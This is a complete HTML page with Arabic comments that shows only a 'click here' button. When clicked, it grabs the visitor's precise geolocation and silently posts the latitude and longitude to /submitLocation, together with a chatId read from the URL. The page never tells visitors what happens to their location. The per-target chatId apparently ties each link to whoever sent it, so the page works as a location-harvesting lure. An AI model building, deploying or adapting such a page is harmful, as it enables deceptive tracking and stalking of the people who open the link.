<!DOCTYPE html>
<html lang="en">
<head>
  <title>Location</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      margin: 0;
      padding: 0;
      background-color: black;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      text-align: center;
      padding: 40px;
      background-color: black;
      border-radius: 8px;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
      border: 2px solid black;
    }
    h1 {
      font-size: 36px;
      margin-bottom: 20px;
      color: white;
    }
    button {
      padding: 12px 24px;
      border: none;
      border-radius: 5px;
      background-color: white;
      color: black;
      cursor: pointer;
      font-size: 16px;
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: #555;
    }
    .result {
      margin-top: 20px;
      font-size: 18px;
      color: white;
    }
    .loading {
      border: 16px solid #f3f3f3;
      border-top: 16px solid #3498db;
      border-radius: 50%;
      width: 120px;
      height: 120px;
      animation: spin 2s linear infinite;
      margin: 0 auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    footer {
      margin-top: 40px;
      color: #666;
    }
  </style>
</head>
<body>
  <div class="container">
    <button onclick="getLocation()">اضغط هنا</button>
    <div class="loading" id="loading" style="display: none;"></div>
    <p class="result" id="userLocation"></p>
    <footer></footer>
  </div>

  <form method="POST" action="/submitLocation" id="location-form">
    <input type="hidden" name="latitude" id="latitude">
    <input type="hidden" name="longitude" id="longitude">
    <input type="hidden" name="chatId" id="chatId">
  </form>

  <script>
    function getLocation() {
      // إظهار العلامة التحميل
      document.getElementById("loading").style.display = "block";
      
      if (navigator.geolocation) {
        // تحديد الموقع بدقة عالية
        navigator.geolocation.getCurrentPosition(showPosition, handleError, { enableHighAccuracy: true });
      } else {
        alert("Geolocation is not supported by this browser.");
        // إخفاء العلامة التحميل
        document.getElementById("loading").style.display = "none";
      }
    }

    function showPosition(position) {
      // إخفاء العلامة التحميل
      document.getElementById("loading").style.display = "none";
      
      var latitude = position.coords.latitude;
      var longitude = position.coords.longitude;
      var chatId = getParameterByName('chatId');
      document.getElementById("latitude").value = latitude;
      document.getElementById("longitude").value = longitude;
      document.getElementById("chatId").value = chatId;
      document.getElementById("location-form").submit();
    }

    function handleError(error) {
      // إخفاء العلامة التحميل
      document.getElementById("loading").style.display = "none";
      
      switch(error.code) {
        case error.PERMISSION_DENIED:
          alert("User denied the request for Geolocation.");
          break;
        case error.POSITION_UNAVAILABLE:
          alert("Location information is unavailable.");
          break;
        case error.TIMEOUT:
          alert("The request to get user location timed out.");
          break;
        case error.UNKNOWN_ERROR:
          alert("An unknown error occurred.");
          break;
      }
    }

    // استخراج قيمة المعلمة من عنوان URL
    function getParameterByName(name, url = window.location.href) {
      name = name.replace(/[\[\]]/g, '\\$&');
      var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
          results = regex.exec(url);
      if (!results) return null;
      if (!results[2]) return '';
      return decodeURIComponent(results[2].replace(/\+/g, ' '));
    }
  </script>
</body>
</html>
